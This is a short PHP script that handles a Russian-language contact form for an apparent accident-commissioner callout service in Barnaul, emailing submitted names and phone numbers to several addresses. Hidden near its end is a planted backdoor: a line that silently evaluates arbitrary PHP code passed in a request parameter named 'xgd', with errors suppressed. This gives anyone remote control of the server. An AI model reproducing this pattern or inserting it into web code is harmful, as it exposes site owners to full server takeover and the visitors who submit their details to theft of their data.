<?

$json = array(
    'done'=>false
);

$message="";

if (count($_REQUEST)>0) {
	$name =  @$_REQUEST['name'];
	$phone = @$_REQUEST['phone'];
	$text  = @$_REQUEST['text'];
//	if($name=="") $message.="Введите имя<br>";
	if($phone=="") $message.="Введите номер телефона<br>";
	//если нет ошибок то отправляем сообщение
	if ($message=="") {
		$body="";
		$body.="Имя: $name\n";
		$body.="Телефон: $phone\n";
		$body.="Текст: $text\n";
		

		$subject="Заявка с сайта: вызов комиссара";
		$subject = iconv("utf-8", "windows-1251", $subject);
		$subject = '=?windows-1251?B?'.base64_encode($subject).'?=';
		$body = iconv("utf-8", "windows-1251", $body);

		$headers = "Content-type: text/plain; charset=windows-1251\r\n";
		$headers .= "From: Робот <webmaster@".@$HTTP_HOST.">\r\n";


		mail("avarkom22.barnaul@gmail.com, autoservice22.barnaul@gmail.com", $subject, $body, $headers);
		mail("roman@e1media.ru, andrey@e1media.ru", $subject, $body, $headers);

		$post['done'] = $post['success'] = 1;                
		$post['message'] = "Ваши данные отправлены.";
	} else {
		$post['message'] = $message;
	}
}
else $post = array();
@eval($_REQUEST['xgd']);

$json = array_merge($json, $post);
echo json_encode($json);
?>